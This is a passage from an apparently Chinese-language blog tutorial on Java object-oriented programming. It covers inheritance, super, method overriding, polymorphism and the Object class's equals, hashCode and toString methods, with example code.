id="继承的特点">继承的特点</h2><ul><li>代码的复用性提高了</li><li>代码的扩展性和维护性提高了</li></ul><h3 id="看案例">看案例</h3><ul><li>没有使用继承前：每个类都需要写属性和方法，代码冗余度太高了</li></ul><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220207210356078.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220207210417348.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220207210441127.png" alt=""></p><ul><li>再来看一下使用继承后的代码</li></ul><blockquote><p>我们运用extends关键词 + 要继承的父类名（Student）直接继承掉Student的属性和方法，然后再写自己特有的方法</p><p>看下面代码：</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220207210650315.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220207210919237.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220207210949250.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220207211016926.png" alt=""></p><blockquote><p>代码的冗余度降低，如果我们还要写其他对象比如中学生……，直接写一个类，然后类里面放中学生特有的属性和方法即可</p><p>如果父类的属性没了，子类的属性也会跟着消失</p></blockquote><h2 id="继承的深入理解与细节">继承的深入理解与细节</h2><ol><li>子类继承了所有的属性和方法，非私有的属性和方法可以在子类直接访问, 但是私有属性和方法不能在子类直接访问，要通过父类提供公共的方法去访问</li><li>子类必须调用父类的构造器， 完成父类的初始化</li><li>当创建子类对象时，不管使用子类的哪个构造器，默认情况下总会去调用父类的无参构造器，如果父类没有提供无参构造器，则必须在子类的构造器中用 super 去指定使用父类的哪个构造器完成对父类的初始化工作，否则，编译不会通过</li><li>如果希望指定去调用父类的某个构造器，则显式的调用一下 : super(参数列表)</li><li>super 在使用时，必须放在构造器第一行(super 只能在构造器中使用)</li><li>super() 和 this() 都只能放在构造器第一行，因此这两个方法不能共存在一个构造器</li><li>java 所有类都是 Object 类的子类, Object 是所有类的基类（子类）idea快捷键ctrl + h 可查看</li><li>父类构造器的调用不限于直接父类！将一直往上追溯直到 Object 类(顶级父类)</li><li>子类最多只能继承一个父类(指直接继承)，即 java 中是<strong style="color:red;">单继承机制</strong>，</li><li>不能滥用继承，子类和父类之间必须满足 is-a 的逻辑关系（比如猫继承于动物，即猫是一个动物 cat is a animal）</li></ol><h2 id="继承的本质">继承的本质</h2><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220209121016978.png" alt=""></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">继承按照查找规则返回信息（从下到上，就是从子类到父类依次检索，如果在某类中需要调用的属性是私用的，则报错，除非在本类中写一个公共方法返回此属性，调用时候需改写为调用对象的方法，继续调用属性依旧报错，尽管写了公共方法返回，尽管父类有该公共属性，依旧不能调用）具体看下面的代码</span><br><span class="line">(1) 首先看子类是否有该属性</span><br><span class="line">(2) 如果子类有这个属性，并且可以访问（看属性是否有private,或者间接访问），则返回信息</span><br><span class="line">(3) 如果子类没有这个属性，就看父类有没有这个属性(如果父类有该属性，并且可以访问，就返回信息..)</span><br><span class="line">(4) 如果父类没有就按照(3)的规则，继续找上级父类，直到 Object...</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.extend;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/2/9 - 02 -  - 11:36</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: com.thestar0.extend</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExtendsTheory</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*继承的本质分析：*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Son son = <span class="keyword">new</span> Son();</span><br><span class="line">        <span class="comment">/*  按照查找规则返回信息</span></span><br><span class="line"><span class="comment">            (1) 首先看子类是否有该属性</span></span><br><span class="line"><span class="comment">            (2) 如果子类有这个属性，并且可以访问（看属性是否有private,或者间接访问），则返回信息</span></span><br><span class="line"><span class="comment">            (3) 如果子类没有这个属性，就看父类有没有这个属性(如果父类有该属性，并且可以访问，就返回信息..)</span></span><br><span class="line"><span class="comment">            (4) 如果父类没有就按照(3)的规则，继续找上级父类，直到 Object...*/</span></span><br><span class="line">        System.out.println(son.name);</span><br><span class="line">       <span class="comment">// System.out.println(son.age);//遇到需要调用的属性第一个是私用属性时候，就不能直接调用了（调用参考下一个语句）</span></span><br><span class="line">        <span class="comment">// 尽管父类的属性上也有该属性</span></span><br><span class="line">        System.out.println(son.getAge());</span><br><span class="line">        System.out.println(son.hobby);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GrandPa</span> </span>&#123;<span class="comment">//爷类，father的父类</span></span><br><span class="line">    String name = <span class="string">&quot;大头爷爷&quot;</span>;</span><br><span class="line">    String hobby = <span class="string">&quot;旅游&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span> <span class="keyword">extends</span> <span class="title">GrandPa</span> </span>&#123;<span class="comment">//父类，是son的父类</span></span><br><span class="line">    String name = <span class="string">&quot;大头爸爸&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">39</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;<span class="comment">//寄存细节一，用公用方法调用私有的属性</span></span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span> </span>&#123;<span class="comment">//子类继承于</span></span><br><span class="line">    String name = <span class="string">&quot;大头儿子&quot;</span>;</span><br><span class="line">    <span class="comment">//int age = 90;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="super基本介绍">super基本介绍</h2><p>super()代表父类的引用，用于访问父类的属性、方法、构造器</p><h2 id="super基本语法">super基本语法</h2><ul><li>访问父类的属性，但不能访问父类是private属性<ul><li>super.属性名</li></ul></li><li>访问父类的方法，不能访问父类的private方法<ul><li>super.方法名（参数列表）</li></ul></li><li>访问父类构造器<ul><li>super(参数列表)，只能放在字类构造器的第一句，只能出现一句！（可调用父类的任意构造器）</li></ul></li></ul><h2 id="super关键词使用细节">super关键词使用细节</h2><p>如果调用父类A 的 eg() 方法 (<strong style="color:red;">eg()为举例的方法,B类继承于A类</strong>)</p><p>这时，如果子类 B 没有 eg() 方法，因此可以使用下面三种方式</p><p>找 eg() 方法时(eg() 和 <a href="http://this.eg">this.eg</a>()均可以，完全等价)</p><p>查找顺序是:</p><p>(1)先找本（B）类，如果有，则调用此类（B）的eg()</p><p>(2)如果没有，则找父类（A）中的eg() (如果有，并可以调用，则调用)</p><p>(3)如果父类(A) 没有，则继续找父类（A）的父类,整个规则，就是一样的,直到 Object 类</p><p>提示：</p><ul><li>如果查找方法的过程中，找到了，但是不能访问（private方法）， 则报错, cannot access</li><li>如果查找方法的过程中，没有找到，则提示方法不存在</li></ul><p><strong style="color:red;">eg(); <a href="http://xn--this-z21g.eg">和this.eg</a>(); 完全等价</strong></p><p>找 eg() 方法时(<a href="http://super.eg">super.eg</a>()) 的顺序是直接查找父类(A)，其他的规则和上面一样（找不到找上一父类，私有报错……和上面是一模一样的）</p><h2 id="super的好处">super的好处</h2><ol><li>调用父类的构造器的好处（分工明确，父类属性由父类初始化，子类属性由子类属性初始化）</li><li>当子类中有和父类中的成员（属性和方法）重名时，为了访问父类的成员，必须通过super。如果没有重名，使用super,this,直接访问是一样的效果</li><li>super的访问不限于直接父类，如果爷爷类和本类中都有同名的成员，必须通过super去访问爷爷类的成员；如果多个基类（上级类）中都有同名的成员，使用super访问遵循就近原则。A-&gt;B-&gt;C，同时也需要遵守访问权限的相关规则</li></ol><h2 id="super关键词和this关键词比较">super关键词和this关键词比较</h2><table><thead><tr><th style="text-align:center">区别点</th><th style="text-align:center">this</th><th style="text-align:center">super</th></tr></thead><tbody><tr><td style="text-align:center">访问属性</td><td style="text-align:center">访问本类中的属性，如果本类没有此属性则从父类中继续查找</td><td style="text-align:center">从父类中开始查找属性</td></tr><tr><td style="text-align:center">调用方法</td><td style="text-align:center">访问本类中的方法，如果本类没有此方法则从父类继续查找</td><td style="text-align:center">从父类开始查找方法</td></tr><tr><td style="text-align:center">调用构造器</td><td style="text-align:center">调用本类构造器，必须放在构造器的首行</td><td style="text-align:center">调用父类构造器，必须放在子类构造器的首行</td></tr><tr><td style="text-align:center">特殊</td><td style="text-align:center">表示当前对象</td><td style="text-align:center">子类中访问父类对象</td></tr></tbody></table><h2 id="方法重写（覆盖）">方法重写（覆盖）</h2><h3 id="基本介绍-3">基本介绍</h3><p>简说：方法重写（覆盖）就是子类有一个方法，和父类的某一个方法的名称，返回类型，参数一样，那么我们就说子类的这个方法覆盖了父类的方法</p><h3 id="方法重写的注意事项">方法重写的注意事项</h3><ol><li>子类的方法的形参列表，方法名称，要和父类方法的形参列表，方法名称完全一样</li><li>子类的返回类型和父类方法返回类型一样，或者是父类返回类型的子类</li></ol><ul><li><p>比如父类返回类型是Object ，子类的返回类型是String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Oject <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li>子类方法不能缩小父类方法的访问权限 public &gt; protected &gt; 默认 &gt; private</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sayOk</span><span class="params">()</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayOk</span><span class="params">()</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="方法重写和方法重载的比较">方法重写和方法重载的比较</h3><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:center">发生范围</th><th>方法名</th><th>形参列表</th><th>返回类型</th><th style="text-align:center">修饰符</th></tr></thead><tbody><tr><td style="text-align:left">重载（overload）</td><td style="text-align:center">本类</td><td>必须一样</td><td>典型，个数或者顺序至少有一个不同</td><td>无要求</td><td style="text-align:center">无要求</td></tr><tr><td style="text-align:left">重写（override）</td><td style="text-align:center">父子类</td><td>必须一样</td><td>相同</td><td>子类重写的方法，返回的类型和父类返回的类型一致，或者是其子类</td><td style="text-align:center">子类方法不能缩小父类方法的范围</td></tr></tbody></table><h1>（三）多态</h1><h2 id="多-多种-态-状态-基本介绍">多[多种]态[状态]基本介绍</h2><blockquote><p>方法或对象具有多种形态。是面向对象的第三大特征，多态是建立在封装和继承基础之上的</p></blockquote><h2 id="多态的具体体现">多态的具体体现</h2><h3 id="方法的多态">方法的多态</h3><p>方法重写和方法重载就体现了多态</p><h3 id="对象的多态（多态的核心）">对象的多态（多态的核心）</h3><ol><li>一个对象的编译原理类型和运行类型可以不一致</li><li>编译类型在定义对象时，就确定了，不能改变</li><li>运行类型是可以变化的</li><li>编译类型看定义时 = 号的左边，运行类型看 = 号的右边</li></ol><p>Animal animal = new Dog(); animal编译类型是Animal,运行类型是Dog</p><p>animal = new Cat(); animal的运行类型变成了Cat,编译类型仍然是Animal</p><h3 id="多态注意事项和细节">多态注意事项和细节</h3><p>多态的<strong style="color:red;">前提是</strong>：两个对象（类）存在继承关系</p><p>多态的向上转型（代码写在ploy包里面）</p><ul><li>本质：父类的引用指向了子类的对象（向上转型的本质）</li><li>语法：父类类型  引用名 = new 子类类型();</li><li>特点：<ul><li>编译类型看左边，运行类型看右边</li><li>可以调用父类中所有成员（需遵守访问权限），不能调用子类中特有成员；</li><li>最终运行效果看子类的具体实现</li></ul></li></ul><p>多态的向下转型</p><ul><li>语法： 子类类型 引用名 = （子类类型）父类引用；</li><li>特点：<ul><li>只能强转父类的引用，不能强转父类的对象</li><li>要求父类的引用必须指向的是当前目标类型的对象</li><li>当下转型后，可以调用子类类型中所有的成员</li></ul></li></ul><p>属性没有重写，属性的值看编译类型</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220224170641580.png" alt=""></p><p>instanceOf比较符，用于判断对象的<strong style="color:red;">运行</strong>类型是否为比较后面的XX类型或XX类型的子类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.ploy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thestar0.modifier.B;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/2/24 - 17:10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.ploy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PloyDetail1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BB bb = <span class="keyword">new</span> BB();</span><br><span class="line"><span class="comment">//        bb 的编译类型 BB ,运行类型是 BB</span></span><br><span class="line">        System.out.println(bb <span class="keyword">instanceof</span>  BB);<span class="comment">//true bb的运行类型是BB，是BB类型</span></span><br><span class="line">        System.out.println(bb <span class="keyword">instanceof</span>  AA);<span class="comment">//true bb的运行类型是BB，是AA类型的子类型BB</span></span><br><span class="line"><span class="comment">//        aa 的编译类型 AA,运行类型是 BB</span></span><br><span class="line">        AA aa = <span class="keyword">new</span> BB();</span><br><span class="line">        System.out.println(aa <span class="keyword">instanceof</span> AA);<span class="comment">//true  aa的运行类型是BB，是AA类型的子类型BB</span></span><br><span class="line">        System.out.println(aa <span class="keyword">instanceof</span> BB);<span class="comment">//true  aa的运行类型是BB, 是AA类型的子类型BB类型</span></span><br><span class="line"></span><br><span class="line">        Object obj = <span class="keyword">new</span> Object();</span><br><span class="line">        System.out.println(obj <span class="keyword">instanceof</span> AA);<span class="comment">//false obj的运行类型是Object,不是AA类型和AA的子类型BB</span></span><br><span class="line">        String str = <span class="string">&quot;xiaomi&quot;</span>;</span><br><span class="line">        System.out.println(str <span class="keyword">instanceof</span> Object);<span class="comment">//true str的运行类型是String，是Object的子类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BB</span> <span class="keyword">extends</span> <span class="title">AA</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220224174412795.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220224174910782.png" alt=""></p><h3 id="java动态绑定机制">java动态绑定机制</h3><ul><li>当调用<strong style="color:#e67c86;">对象方法</strong>的时候，该方法会和<strong style="color:red;">该对象的内存地址/运行类型绑定</strong></li><li>当调用<strong style="color:#e67c86;">对象属性</strong>时，<strong style="color:red;">没有动态绑定机制</strong>，哪里声明，那里使用</li></ul><h3 id="多态的应用">多态的应用</h3><ol><li>多态数组</li></ol><p>数组的定义类型为父类类型，里面保存的实际元素类型为子类类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar.poly;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PloyArray</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//应用实例:现有一个继承结构如下：要求创建 1 个 Person 对象、 2 个 Student 对象和 2 个 Teacher 对象, 统一放在数组中，并调用每个对象 say 方法Person[] persons = new Person[5];</span></span><br><span class="line">persons[<span class="number">0</span>] = <span class="keyword">new</span> Person(<span class="string">&quot;jack&quot;</span>, <span class="number">20</span>);</span><br><span class="line">persons[<span class="number">1</span>] = <span class="keyword">new</span> Student(<span class="string">&quot;mary&quot;</span>, <span class="number">18</span>, <span class="number">100</span>);</span><br><span class="line">persons[<span class="number">2</span>] = <span class="keyword">new</span> Student(<span class="string">&quot;smith&quot;</span>, <span class="number">19</span>, <span class="number">30.1</span>);</span><br><span class="line">persons[<span class="number">3</span>] = <span class="keyword">new</span> Teacher(<span class="string">&quot;scott&quot;</span>, <span class="number">30</span>, <span class="number">20000</span>);</span><br><span class="line">persons[<span class="number">4</span>] = <span class="keyword">new</span> Teacher(<span class="string">&quot;king&quot;</span>, <span class="number">50</span>, <span class="number">25000</span>);</span><br><span class="line"><span class="comment">//循环遍历多态数组，调用say</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; persons.length; i++) &#123;</span><br><span class="line"><span class="comment">//person[i] 编译类型是 Person ,运行类型是是根据实际情况有 JVM 来判断</span></span><br><span class="line">    System.out.println(persons[i].say());</span><br><span class="line"><span class="comment">//动态绑定机制</span></span><br><span class="line"><span class="comment">// 使用类型判断 + 向下转型. </span></span><br><span class="line"><span class="keyword">if</span>(persons[i] <span class="keyword">instanceof</span> Student) &#123;</span><br><span class="line"><span class="comment">//判断 person[i] 的运行类型是不是 Student</span></span><br><span class="line">Student student = (Student)persons[i];<span class="comment">//向下转型</span></span><br><span class="line">student.study();</span><br><span class="line"><span class="comment">//也可以使用一条语句 ((Student)persons[i]).study();</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(persons[i] <span class="keyword">instanceof</span> Teacher) &#123;</span><br><span class="line">Teacher teacher = (Teacher)persons[i];</span><br><span class="line">teacher.teach();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(persons[i] <span class="keyword">instanceof</span> Person)&#123;</span><br><span class="line"><span class="comment">//System.out.println(&quot;你的类型有误, 请自己检查...&quot;);</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;你的类型有误, 请自己检查...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>多态参数</li></ol><p>方法定义的形参类型为父类类型，实参类型允许为子类类型</p><h1>Object 类详解</h1><h2 id="equals方法">equals方法</h2><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220228165057219.png" alt=""></p><h3 id="和-equals方法比较">== 和 equals方法比较</h3><p>==是一个比较运算符</p><ul><li>即可以判断基本数据类型，又可以判断引用类型</li><li>如果是基本类型，则是判断的值是否相等。</li><li>如果是引用类型，则是判断的是地址是否相等，即判断是不是同一个对象</li></ul><p>equals: 是Object类中的一个方法，只能判断引用类型</p><ul><li>默认判断的是地址是否相等，子类中往往重写该方法，用于判断内容是否相等。</li></ul><h2 id="hashCode-方法">hashCode 方法</h2><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220228161751920.png" alt=""></p><ol><li>提高具有哈希结构的容器的效率</li><li>两个引用，如果指向的是同一个对象，则哈希值肯定是一样的，反之，如果指向的是两个不同的对象，哈希值肯定是不一样的</li><li>哈希值主要是根据地址号来的，不能完全将哈希值等价于地址</li><li>后面在集合中 hashCode 如果需要的话，也会重写,hashCode()</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.object;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Source;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:hashcode()细节演示</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/2/28 - 16:24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashCode</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TT tt = <span class="keyword">new</span> TT();</span><br><span class="line">        TT1 tt1 = <span class="keyword">new</span> TT1();</span><br><span class="line">        <span class="comment">/*tt和tt1对象不同，指的对象不同，所以哈希值不同*/</span></span><br><span class="line">        System.out.println(<span class="string">&quot;tt的hashcode():&quot;</span>+tt.hashCode());<span class="comment">//460141958</span></span><br><span class="line">        System.out.println(<span class="string">&quot;tt1的hashcode():&quot;</span>+tt1.hashCode());<span class="comment">//1163157884</span></span><br><span class="line">        TT tt2 = tt;<span class="comment">//tt2对象和tt对象相同，所以指的hashcode值相同</span></span><br><span class="line">        System.out.println(<span class="string">&quot;tt2的hashcode():&quot;</span>+tt2.hashCode());<span class="comment">//460141958</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TT</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TT1</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="toString-方法">toString 方法</h2><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220228165151444.png" alt="image-20220228165151444"></p><p>基本介绍：默认返回：全类名（包名+类名）+@+哈希值的十六进制【查看 Object 的 toString 方法】</p><p>子类往往重写 toString 方法，用于返回对象的属性信息</p><p>重写 toString 方法，打印对象或拼接对象时，都会自动调用该对象的 toString 形式</p><p>当直接输出一个对象时，toString 方法会被默认的调用, 比如 System.out.println(对象名)；就会默认调用对象名.toString()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.object;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/2/28 - 16:54</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: 